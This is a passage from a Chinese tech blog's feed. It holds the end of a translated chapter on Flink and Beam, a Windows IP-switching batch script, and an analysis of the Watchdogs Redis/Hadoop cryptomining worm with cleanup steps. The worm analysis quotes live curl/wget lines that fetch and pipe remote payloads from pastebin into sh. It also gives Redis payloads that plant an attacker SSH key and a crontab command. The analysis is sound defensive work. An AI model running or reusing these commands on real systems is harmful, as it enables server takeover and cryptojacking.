src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3h7doer6ij20u00dwaaa.jpg" alt></p><p>在我看来，Flink 崛起有两个主要原因：</p><ul><li>采用 Dataflow/Beam 编程模型，使其成为完备语义功能的开源流式处理系统。</li><li>其高效的快照实现方式，源自 Chandy 和 Lamport 的原始论文《“Distributed Snapshots: Determining Global States of Distributed Systems”》的研究，这为其提供了正确性所需的强一致性保证。</li></ul><p>Reuven 在第 5 章中简要介绍了 Flink 的一致性机制，这里在重申一下，其基本思想是在系统中的 Worker 之间沿着数据传播路径上产生周期性 Barrier。这些 Barrier 充当了在不同 Worker 之间传输数据时的对齐机制。当一个 Worker 在其所有上游算子输入来源（即来自其所有上游一层的 Worker）上接收到全部 Barrier 时，Worker 会将当前所有 key 对应的状态写入一个持久化存储。这个过程意味着将这个 Barrier 之前的所有数据都做了持久化。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3h7du1knjj20u00qbwha.jpg" alt></p><p>通过调整 Barrier 的生成频率，可以间接调整 Checkpoint 的执行频率，从而降低时延并最终获取更高的吞吐（其原因是做 Checkpoint 过程中涉及到对外进行持久化数据，因此会有一定的 IO 导致延时）。</p><p>Flink 既能够支持精确一次的语义处理保证，同时又能够提供支持事件时间的处理能力，这让 Flink 获取的巨大的成功。接着， Jamie Grier 发表他的题为“《Extending the Yahoo! Streaming Benchmark》“（图 10-30）的文章，文章中描述了 Flink 性能具体的测试数据。在那篇文章中，杰米描述了两个令人印象深刻的特点：</p><ol><li><p>构建一个用于测试的 Flink 数据管道，其拥有比 Twitter Storm 更高的准确性（归功于 Flink 的强一次性语义），但成本却降到了 1％。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3h7e1vjk5j20u00wwq5v.jpg" alt></p><ol start="2"><li><p>Flink 在精确一次的处理语义参数设定下，仍然达到 Storm 的 7.5 倍吞吐量（而且，Storm 还不具备精确一次的处理语义）。此外，由于网络被打满导致 Flink 的性能受到限制 ; 进一步消除网络瓶颈后 Flink 的吞吐量几乎达到 Storm 的 40 倍。</p><p>从那时起，许多其他流式处理项目（特别是 Storm 和 Apex）都采用了类似算法的数据处理一致性机制。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3h7ec9lylj20u00vk0u6.jpg" alt></p><p>通过快照机制，Flink 获得了端到端数据一致性。Flink 更进了一步，利用其快照的全局特性，提供了从过去的任何一点重启整个管道的能力，这一功能称为 SavePoint（在 Fabian Hueske 和 Michael Winters 的帖子 [《Savepoints: Turning Back Time》(<a href="https://data-artisans.com/blog/turning-back-time-savepoints)]" target="_blank" rel="noopener">https://data-artisans.com/blog/turning-back-time-savepoints)]</a> 中有所描述，[图 10-31]）。Savepoints 功能参考了 Kafka 应用于流式传输层的持久化和可重放特性，并将其扩展应用到整个底层 Pipeline。流式处理仍然遗留大量开放性问题有待优化和提升，但 Flink 的 Savepoints 功能是朝着正确方向迈出的第一步，也是整个行业非常有特点的一步。 如果您有兴趣了解有关 Flink 快照和保存点的系统构造的更多信息，请参阅《State Management in Apache Flink》（图 10-32），论文详细讨论了相关的实现。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3h7ein1n1j20u00qstdj.jpg" alt></p><p>除了保存点之外，Flink 社区还在不断创新，包括将第一个实用流式 SQL API 推向大规模分布式流处理引擎的领域，正如我们在第 8 章中所讨论的那样。 总之，Flink 的迅速崛起成为流计算领军角色主要归功于三个特点：</p><ol><li>整合行业里面现有的最佳想法（例如，成为第一个开源 DataFlow/Beam 模型）</li><li>创新性在表上做了大量优化，并将状态管理发挥更大价值，例如基于 Snapshot 的强一致性语义保证，Savepoints 以及流式 SQL。</li><li>迅速且持续地推动上述需求落地。</li></ol><p>另外，所有这些改进都是在开源社区中完成的，我们可以看到为什么 Flink 一直在不断提高整个行业的流计算处理标准。</p><h3 id="Beam"><a href="#Beam" class="headerlink" title="Beam"></a>Beam</h3><p>我们今天谈到的最后一个系统是 Apache Beam（图 10-33）。 Beam 与本章中的大多数其他系统的不同之处在于，它主要是编程模型，API 设计和可移植层，而不是带有执行引擎的完整系统栈。但这正是我想强调的重点：正如 SQL 作为声明性数据处理的通用语言一样，Beam 的目标是成为程序化数据处理的通用语言。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3h7evt7rkj20u00dw3yq.jpg" alt></p><p>具体而言，Beam 由许多组件组成：</p><ul><li>一个统一的批量加流式编程模型，继承自 Google DataFlow 产品设计，以及我们在本书的大部分内容中讨论的细节。该模型独立于任何语言实现或 runtime 系统。您可以将此视为 Beam 等同于描述关系代数模型的 SQL。</li><li>一组实现该模型的 SDK（软件开发工具包），允许底层的 Pipeline 以不同 API 语言的惯用方式编排数据处理模型。 Beam 目前提供 Java，Python 和 Go 的 SDK，可以将它们视为 Beam 的 SQL 语言本身的程序化等价物。</li><li>一组基于 SDK 的 DSL（特定于域的语言），提供专门的接口，以独特的方式描述模型在不同领域的接口设计。SDK 来描述上述模型处理能力的全集，但 DSL 描述一些特定领域的处理逻辑。 Beam 目前提供了一个名为 Scio 的 Scala DSL 和一个 SQL DSL，它们都位于现有 Java SDK 之上。</li><li>一组可以执行 Beam Pipeline 的执行引擎。执行引擎采用 Beam SDK 术语中描述的逻辑 Pipeline，并尽可能高效地将它们转换为可以执行的物理计划。目前，针对 Apex，Flink，Spark 和 Google Cloud Dataflow 存在对应的 Beam 引擎适配。在 SQL 术语中，您可以将这些引擎适配视为 Beam 在各种 SQL 数据库的实现，例如 Postgres，MySQL，Oracle 等。</li></ul><p>Beam 的核心愿景是实现一套可移植接口层，最引人注目的功能之一是它计划支持完整的跨语言可移植性。尽管最终目标尚未完全完成（但即将面市），让 Beam 在 SDK 和引擎适配之间提供足够高效的抽象层，从而实现 SDK 和引擎适配之间的任意切换。我们畅想的是，用 JavaScript SDK 编写的数据 Pipeline 可以在用 Haskell 编写的引擎适配层上无缝地执行，即使 Haskell 编写的引擎适配本身没有执行 JavaScript 代码的能力。</p><p>作为一个抽象层，Beam 如何定位自己和底层引擎关系，对于确保 Beam 实际为社区带来价值至关重要，我们也不希望看到 Beam 引入一个不必要的抽象层。这里的关键点是，Beam 的目标永远不仅仅是其所有底层引擎功能的交集（类似最小公分母）或超集（类似厨房水槽）。相反，它旨在为整个社区大数据计算引擎提供最佳的想法指导。这里面有两个创新的角度:</p><ul><li><strong>Beam 本身的创新</strong></li></ul><p>Beam 将会提出一些 API，这些 API 需要底层 runtime 改造支持，并非所有底层引擎最初都支持这些功能。这没关系，随着时间的推移，我们希望许多底层引擎将这些功能融入未来版本中 ; 对于那些需要这些功能的业务案例来说，具备这些功能的引擎通常会被业务方选择。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3h7f2cqotj20u00l4gnr.jpg" alt></p><p>这里举一个 Beam 里面关于 SplittableDoFn 的 API 例子，这个 API 可以用来实现一个可组合的，可扩展的数据源。（具体参看 Eugene Kirpichov 在他的文章《 “Powerful and modular I/O connectors with Splittable DoFn in Apache Beam》中描述 [图 10-34]）。它设计确实很有特点且功能强大，目前我们还没有看到所有底层引擎对动态负载均衡等一些更具创新性功能进行广泛支持。然而，我们预计这些功能将随着时间的推移而持续加入底层引擎支持的范围。</p><ul><li><strong>底层引擎的创新</strong></li></ul><p>底层引擎适配可能会引入底层引擎所独特的功能，而 Beam 最初可能并未提供 API 支持。这没关系，随着时间的推移，已证明其有用性的引擎功能将在 Beam API 逐步实现。</p><p>这里的一个例子是 Flink 中的状态快照机制，或者我们之前讨论过的 Savepoints。 Flink 仍然是唯一一个以这种方式支持快照的公开流处理系统，但是 Beam 提出了一个围绕快照的 API 建议，因为我们相信数据 Pipeline 运行时优雅更新对于整个行业都至关重要。如果我们今天推出这样的 API，Flink 将是唯一支持它的底层引擎系统。但同样没关系，这里的重点是随着时间的推移，整个行业将开始迎头赶上，因为这些功能的价值会逐步为人所知。这些变化对每个人来说都是一件好事。</p><p>通过鼓励 Beam 本身以及引擎的创新，我们希望推进整个行业快速演化，而不用再接受功能妥协。 通过实现跨执行引擎的可移植性承诺，我们希望将 Beam 建立为表达程序化数据处理流水线的通用语言，类似于当今 SQL 作为声明性数据处理的通用处理方式。这是一个雄心勃勃的目标，我们并没有完全实现这个计划，到目前为止我们还有很长的路要走。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>我们对数据处理技术的十五年发展进行了蜻蜓点水般的回顾，重点关注那些推动流式计算发展的关键系统和关键思想。来，最后，我们再做一次总结：</p><ul><li><strong>MapReduce：可扩展性和简单性</strong> 通过在强大且可扩展的执行引擎之上提供一组简单的数据处理抽象，MapReduce 让我们的数据工程师专注于他们的数据处理需求的业务逻辑，而不是去构建能够适应在一大堆普通商用服务器上的大规模分布式处理程序。</li><li><strong>Hadoop：开源生态系统</strong> 通过构建一个关于 MapReduce 的开源平台，无意中创建了一个蓬勃发展的生态系统，其影响力所及的范围远远超出了其最初 Hadoop 的范围，每年有大量的创新性想法在 Hadoop 社区蓬勃发展。</li><li><strong>Flume：管道及优化</strong> 通过将逻辑流水线操作的高级概念与智能优化器相结合，Flume 可以编写简洁且可维护的 Pipeline，其功能突破了 MapReduce 的 Map→Shuffle→Reduce 的限制，而不会牺牲性能。</li><li><strong>Storm：弱一致性，低延迟</strong> 通过牺牲结果的正确性以减少延迟，Storm 为大众带来了流计算，并开创了 Lambda 架构的时代，其中弱一致的流处理引擎与强大一致的批处理系统一起运行，以实现真正的业务目标低延迟，最终一致型的结果。</li><li><strong>Spark: 强一致性</strong> 通过利用强大一致的批处理引擎的重复运行来提供无界数据集的连续处理，Spark Streaming 证明至少对于有序数据集的情况，可以同时具有正确性和低延迟结果。</li><li><strong>MillWheel：乱序处理</strong> 通过将强一致性、精确一次处理与用于推测时间的工具（如水印和定时器）相结合，MillWheel 做到了无序数据进行准确的流式处理。</li><li><strong>Kafka: 持久化的流式存储，流和表对偶性</strong> 通过将持久化数据日志的概念应用于流传输问题，Kafka 支持了流式数据可重放功能。通过对流和表理论的概念进行推广，阐明数据处理的概念基础。</li><li><strong>Cloud Dataflow：统一批流处理引擎</strong> 通过将 MillWheel 的无序流式处理与高阶抽象、自动优化的 Flume 相结合，Cloud Dataflow 为批流数据处理提供了统一模型，并且灵活地平衡正确性、计算延迟、成本的关系。</li><li><strong>Flink：开源流处理创新者</strong> 通过快速将无序流式数据处理的强大功能带到开源世界，并将其与分布式快照及保存点功能等自身创新相结合，Flink 提高了开源流处理的业界标准并引领了当前流式处理创新趋势。</li><li><strong>Beam: 可移植性</strong> 通过提供整合行业最佳创意的强大抽象层，Beam 提供了一个可移植 API 抽象，其定位为与 SQL 提供的声明性通用语言等效的程序接口，同时也鼓励在整个行业中推进创新。</li></ul><p>可以肯定的说，我在这里强调的这 10 个项目及其成就的说明并没有超出当前大数据的历史发展。但是，它们对我来说是一系列重要且值得注意的大数据发展里程碑，它共同描绘了过去十五年中流处理演变的时间轴。自最早的 MapReduce 系统开始，尽管沿途有许多起伏波折，但不知不觉我们已经走出来很长一段征程。即便如此，在流式系统领域，未来我们仍然面临着一系列的问题亟待解决。正所谓：路漫漫其修远兮，吾将上下而求索。</p></li></ol></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;文章原作者是Google MapReduce小组的一员，翻译自《Streaming System》最后一章《The Evolution of Large-Scale Data Processing》，翻译者是 陈守元（花名：巴真），阿里巴巴高级产品专家。阿里巴巴实时计算团队产品负责人。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;我最近看了一些深度学习的文章，有一些感触，机器学习的使用范围确实很有限，大众以为现在的AI和现在实际上的AI其实根本不是一个东西，如果机器学习能在短时间内迅速发展起来，我个人觉得只有两种可能：第一种可能：要么横向在某个传统行业取得巨大进展，被其他行业纷纷效仿，但是很难，机器学习需要都整体数据有一个完全的把控，只有已经自动化相当完备的行业才有使用机器学习的基础，更何况还有行业壁垒，从中盈利的公司可能根本不会宣传，别的人也就无从得知了。&lt;/p&gt;
&lt;p&gt;第二种可能：深度学习出现重大进展，深度学习作为黑盒使用是一件很离谱的事情，理论上来说要解析深度学习的原理需要很多别的学科来进行理论支持，短时间内出现重大进展其实可能也不大。&lt;/p&gt;
&lt;p&gt;那么如果AI这阵风最终没有刮起来，那么还是要看流处理的了。&lt;/p&gt;
&lt;p&gt;下面是原文：&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="Reading notes" scheme="http://yoursite.com/categories/Reading-notes/"/>
    
      <category term="技术发展史" scheme="http://yoursite.com/categories/Reading-notes/%E6%8A%80%E6%9C%AF%E5%8F%91%E5%B1%95%E5%8F%B2/"/>
    
    
      <category term="Reading notes" scheme="http://yoursite.com/tags/Reading-notes/"/>
    
      <category term="大数据" scheme="http://yoursite.com/tags/%E5%A4%A7%E6%95%B0%E6%8D%AE/"/>
    
      <category term="流式计算" scheme="http://yoursite.com/tags/%E6%B5%81%E5%BC%8F%E8%AE%A1%E7%AE%97/"/>
    
      <category term="大数据浪潮史" scheme="http://yoursite.com/tags/%E5%A4%A7%E6%95%B0%E6%8D%AE%E6%B5%AA%E6%BD%AE%E5%8F%B2/"/>
    
  </entry>
  
  <entry>
    <title>win环境下更换IP的批处理</title>
    <link href="http://yoursite.com/2019/06/18/%E6%89%B9%E5%A4%84%E7%90%86%E6%9B%B4%E6%94%B9IP/"/>
    <id>http://yoursite.com/2019/06/18/批处理更改IP/</id>
    <published>2019-06-18T07:40:44.237Z</published>
    <updated>2019-05-09T06:45:42.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>之前公司IP地址出了点问题，要两个IP来回切换，找了个脚本一运行就出现问题，这边记录一下<br>脚本里面的网络名称尽量用英文的，先去网络适配里面更改一下，因为我这边尝试用原来的“本地连接”名字会出现乱码的情况，可能和命令行的编码有关</p></blockquote><a id="more"></a> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">@echo off</span><br><span class="line">cls</span><br><span class="line">color 0A</span><br><span class="line"> </span><br><span class="line">@echo off</span><br><span class="line">echo.</span><br><span class="line">echo ===change IP?==</span><br><span class="line">echo.</span><br><span class="line">echo 1:auto</span><br><span class="line">echo.</span><br><span class="line">echo 2:zt</span><br><span class="line">echo.</span><br><span class="line">echo.</span><br><span class="line">set/p sel=changestyle</span><br><span class="line">if &quot;%sel%&quot;==&quot;1&quot; goto auto</span><br><span class="line">if &quot;%sel%&quot;==&quot;2&quot; goto zt</span><br><span class="line">echo you dont choose</span><br><span class="line">goto end</span><br><span class="line"> </span><br><span class="line">:auto</span><br><span class="line">netsh interface ip set address name=&quot;local connection&quot; source=dhcp</span><br><span class="line">netsh interface ip delete dns &quot;local connection&quot; all</span><br><span class="line">ipconfig /flushdns</span><br><span class="line">ipconfig /all</span><br><span class="line">goto end</span><br><span class="line"> </span><br><span class="line">:zt</span><br><span class="line">echo waiting...</span><br><span class="line">netsh interface ip set address name=&quot;local connection&quot; source=static addr=10.0.20.22 mask=255.255.248.0 gateway=10.0.16.1 gwmetric=1</span><br><span class="line">netsh interface ip set dns name=&quot;local connection&quot; source=static addr=222.96.134.133</span><br><span class="line">netsh interface ip add dns name=&quot;local connection&quot; addr=222.96.128.68 index=2 </span><br><span class="line">ipconfig /flushdns</span><br><span class="line">ipconfig /all</span><br><span class="line">echo finish</span><br><span class="line">goto end</span><br><span class="line"> </span><br><span class="line">:end</span><br><span class="line">pause</span><br></pre></td></tr></table></figure><p>IP地址是我随便写的，修改IP，保存为.bat后，修改本地连接名称，管理员运行就可以执行</p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;之前公司IP地址出了点问题，要两个IP来回切换，找了个脚本一运行就出现问题，这边记录一下&lt;br&gt;脚本里面的网络名称尽量用英文的，先去网络适配里面更改一下，因为我这边尝试用原来的“本地连接”名字会出现乱码的情况，可能和命令行的编码有关&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="Win" scheme="http://yoursite.com/categories/Win/"/>
    
      <category term="IP Change" scheme="http://yoursite.com/categories/Win/IP-Change/"/>
    
    
      <category term="Win" scheme="http://yoursite.com/tags/Win/"/>
    
      <category term="Tips" scheme="http://yoursite.com/tags/Tips/"/>
    
  </entry>
  
  <entry>
    <title>hadoop病毒案例分析</title>
    <link href="http://yoursite.com/2019/06/18/%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    <id>http://yoursite.com/2019/06/18/大数据病毒分析/</id>
    <published>2019-06-18T07:40:44.230Z</published>
    <updated>2019-05-10T03:02:03.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>京东云和公司集群分别遇到过一次挖矿脚本，经过分析，发现两次挖矿事件有所不同，在这篇文档记录下两次挖矿事件的异同、总结和反思。</p></blockquote><a id="more"></a> <h3 id="第二次事件分析"><a href="#第二次事件分析" class="headerlink" title="第二次事件分析"></a>第二次事件分析</h3><p>我遇到的两次挖矿事件分别是由于<code>Hadoop Yarn REST API</code>未授权漏洞和<code>Redis</code>未授权访问漏洞这两种常见的配置问题引发的。</p><p>目前可以确定的是，第二次遇到的是Watchdogs蠕虫，这种蠕虫病毒第一次发现是2019年2月20日，阿里云安全监测到一起大规模挖矿事件，判断为Watchdogs蠕虫导致，该蠕虫短时间内即造成大量Linux主机沦陷，一方面是利用Redis未授权访问和弱密码这两种常见的配置问题进行传播，另一方面从known_hosts文件读取ip列表，用于登录信任该主机的其他主机。这两种传播手段都不是第一次用于蠕虫，但结合在一起爆发出巨大的威力。</p><p>蠕虫感染路径如下图：</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2v117hz8tj20z80iygok.jpg" alt></p><p>蠕虫传播方式：</p><p>攻击者首先扫描存在未授权访问或弱密码的Redis，并控制相应主机去请求以下地址：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://pastebin.com/raw/sByq0rym</span><br></pre></td></tr></table></figure><p>该地址包含的命令是请求、base64解码并执行另一个url地址的内容：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(curl -fsSL https://pastebin.com/raw/D8E71JBJ||wget -q -O- https://pastebin.com/raw/D8E71JBJ)|base64 -d|sh</span><br></pre></td></tr></table></figure><p>而<a href="https://pastebin.com/raw/D8E71JBJ" target="_blank" rel="noopener">https://pastebin.com/raw/D8E71JBJ</a> 的内容解码后为一个bash脚本，脚本中又包含下载恶意程序Watchdogs的指令。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(curl -fsSL http://thyrsi.com/t6/672/1550667479x1822611209.jpg -o /tmp/watchdogs||wget -q http://thyrsi.com/t6/672/1550667479x1822611209.jpg -O /tmp/watchdogs) &amp;&amp; chmod +x /tmp/watchdogs</span><br></pre></td></tr></table></figure><p>如上图所示，本次蠕虫的横向传播分为两块。</p><p>一是Bash脚本包含的如下内容，会直接读取主机上的/root/.ssh/known_hosts和/root/.ssh/id_rsa.pub文件，用于登录信任当前主机的机器，并控制这些机器执行恶意指令。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2v13zzr57j20ix036my8.jpg" alt></p><p>二是Bash脚本下载的Watchdogs程序，通过对Redis的未授权访问和爆破、以及对SSH的爆破，进行横向传播。</p><p>具体为表现为，Watchdogs程序的Bbgo()函数中，首先获取要攻击的ip列表，随后尝试登录其他主机的ssh服务，一旦登录成功则执行恶意脚本下载命令。在Ago()函数中，则表现为针对其他主机Redis的扫描和攻击。</p><p>恶意Bash脚本</p><p>除了下载Watchdogs程序和横向传播外，Bash脚本还具有以下几项功能。</p><ol><li><p>将下载自身的指令添加到crontab定时任务里面，定时执行。</p></li><li><p>杀死同类的挖矿僵尸木马进程。</p></li><li><p>杀死CPU占用大于80%的进程</p></li></ol><p>bash脚本的功能也很很常见，一般来说挖矿程序几乎都有这样的功能。</p><p>Watchdogs程序为elf可执行文件，由go语言编译，其主要函数结构如下所示：</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2v14wnj8cj207v09nq2w.jpg" alt></p><p>1.<code>LibiosetWrite()</code></p><p>该函数主要执行libioset.so文件的写入</p><p>2.<code>Cron()</code></p><p>将恶意下载命令添加到/etc/cron.d/root等多个文件中，定时执行，加大清理难度</p><p>3.<code>KsoftirqdsWriteRun()</code></p><p>解压并写入挖矿程序及其配置文件</p><p>Bbgo()和Ago()函数的功能在“蠕虫传播方式”一节已有介绍，此处不再赘述。</p><p>综上，Watchdogs程序在Bash脚本执行的基础上，将进一步进行挖矿程序的释放和执行、恶意so文件写入以及剩余的横向传播。</p><p><code>libioset.so</code>分析</p><p>如图是<code>libioset.so</code>的导出函数表，包括<code>unlink</code>, <code>rmdir</code>, <code>readdir</code>等。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2v1627gnej20rs0lqaay.jpg" alt></p><p>这里以执行rm命令必须调用的unlink()函数为例。</p><p>它只对不包含”ksoftirqds”、”ld.so.preload”、”libioset.so”这几个字符串的文件调用正常的unlink()，导致几个文件无法被正常删除。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2v16ez6vbj2192042js9.jpg" alt></p><p>其他几个命令，如<code>readdir</code>也是类似，无法正常返回关于恶意程序的结果。</p><p>而<code>fopen</code>函数更是变本加厉，由于系统查询<code>cpu</code>使用情况和端口占用情况时，都会调用<code>fopen</code>，于是攻击者<code>hook</code>了这一函数，使其在读取<code>&#39;/proc/stat&#39;</code>和<code>&#39;/proc/net/tcp&#39;</code>等文件时，调用伪造函数。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2v1737f5rj20r602qwez.jpg" alt></p><p>其中<code>forge_proc_cpu()</code>函数，将返回硬编码的字符串</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2v17j9t4kj21c80eo0ul.jpg" alt></p><p>这种对查看系统状态功能的恶意hook，导致用户难以通过简单自查，确定挖矿是否存在以及挖矿进程是哪个。</p><p>“许多黑客模仿我的代码”——数据库蠕虫趋势统计</p><p>此次的Watchdogs挖矿蠕虫与18年出现的kworkerd蠕虫出自同一位作者（关于kworkerd挖矿僵尸网络参见《2018年云上挖矿分析报告》），因为它们使用了相同的钱包地址和相似的攻击手法。此外作者在恶意脚本末尾的注释也印证了这点：</p><p>#1.If you crack my program, please don’t reveal too much code online.Many hacker boys have copied my kworkerds code,more systems are being attacked.(Especially libioset)…</p><p>这段注释同时也揭露了一个事实，“许多黑客模仿我的代码”——当一个攻击者采取了某种攻击手法并取得成功，其他攻击者会纷纷模仿，很快将该手段加入自己的“攻击大礼包”。</p><p>这种模仿的结果是，据阿里云安全不完全统计，利用Redis未授权访问等问题进行攻击的蠕虫，数量已从2018年中的一个，上涨到如今的40余个，其中不乏DDG、8220这样臭名昭著的挖矿团伙。此外大部分近期新出现的蠕虫，都会加上Redis利用模块，因为实践证明互联网上错误配置的Redis数据库数量庞大，能从其中分一杯羹，攻击者的盈利就能有很大的提升。</p><p>因而如果不保护好Redis，用户面临的将不是一个蠕虫，而是40余个蠕虫此起彼伏的攻击。</p><p>下图所示为近半年来，针对Redis的攻击流量和目标机器数量趋势，从中不难看出Redis攻击逐渐被各大僵尸网络采用，并在2018年10月11月保持非常高的攻击量；而后在经历了3个月左右的沉寂期后，在今年2月再次爆发。</p><p>而Redis本身遭受攻击的主流方法也经过了三个阶段</p><p>1.攻击者对存在未授权访问的Redis服务器写入ssh key，从而可以畅通无阻登录ssh服务</p><p>具体为执行以下payload</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config set dir /root/.ssh/</span><br><span class="line">config set dbfilename authorized_keys</span><br><span class="line">set x "\n\n\nssh-rsa 【sshkey】 root@kali\n\n\n"</span><br><span class="line">save</span><br></pre></td></tr></table></figure><p>其中【sshkey】表示攻击者的密钥</p><p>2.攻击者对存在未授权访问的<code>Redis</code>服务器写入<code>crontab</code>文件，定时执行恶意操作</p><p>具体为执行以下<code>payload</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config set dir /var/spool/cron</span><br><span class="line">config set dbfilename root</span><br><span class="line">set x "【evil command】"</span><br><span class="line">save</span><br></pre></td></tr></table></figure><p>3.以上两个阶段中仅对<code>Redis</code>完全没有验证即可访问的情况，第三个阶段则开始针对设置了密码验证，但密码较弱的<code>Redis</code>进行攻击，受害范围进一步扩大。</p><p>然而<code>Redis</code>并不是唯一一个受到黑客“青眼”的数据库。如下表所示，<code>SQL Server</code>, <code>Mysql</code>, <code>Mongodb</code>这些常用数据库的安全问题，也被多个挖矿僵尸网络所利用；利用方式集中在未授权访问、密码爆破和漏洞利用。</p><h3 id="处理办法"><a href="#处理办法" class="headerlink" title="处理办法"></a>处理办法</h3><p>1.首先停止<code>cron</code>服务，避免因其不断执行而导致恶意文件反复下载执行。</p><p>如果操作系统可以使用service命令，则执行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service crond stop</span><br></pre></td></tr></table></figure><p>如果没有service命令，执行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/cron stop</span><br></pre></td></tr></table></figure><p>2.随后使用<code>busybox</code>删除以下两个so文件：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo busybox rm -f /etc/ld.so.preload</span><br><span class="line">sudo busybox rm -f /usr/local/lib/libioset.so</span><br><span class="line">sudo ldconfig</span><br></pre></td></tr></table></figure><p><code>busybox</code>是一个小巧的<code>unix</code>工具集，许多<code>Linux</code>系统装机时已集成。使用它进行删除是因为系统自带的<code>rm</code>命令需要进行动态<code>so</code>库调用，而<code>so</code>库被恶意<code>hook</code>了，无法进行正常删除；而<code>busybox</code>的<code>rm</code>是静态编译的，无需调用<code>so</code>文件，所以不受影响。</p><p>3.清理恶意进程</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo kill -9 `ps -ef|grep Watchdogs|grep -v grep |awk '&#123;print $2&#125;'`</span><br><span class="line">sudo kill -9 `ps -ef|grep ksoftirqds|grep -v grep |awk '&#123;print $2&#125;'`</span><br></pre></td></tr></table></figure><p>4.清理cron相关文件，重启服务，具体为检查以下文件并清除其中的恶意指令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/var/spool/cron/crontabs/root</span><br><span class="line">/var/spool/cron/root</span><br><span class="line">/etc/cron.d/root</span><br></pre></td></tr></table></figure><p>之后执行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service crond start</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/cron start</span><br></pre></td></tr></table></figure><p>如果执行了以上操作任然发现有挖矿程序在运行的话，基本可以判断为机器上任然有病毒程序没有删除干净，对症下药即可。</p><h3 id="来自阿里云的安全建议"><a href="#来自阿里云的安全建议" class="headerlink" 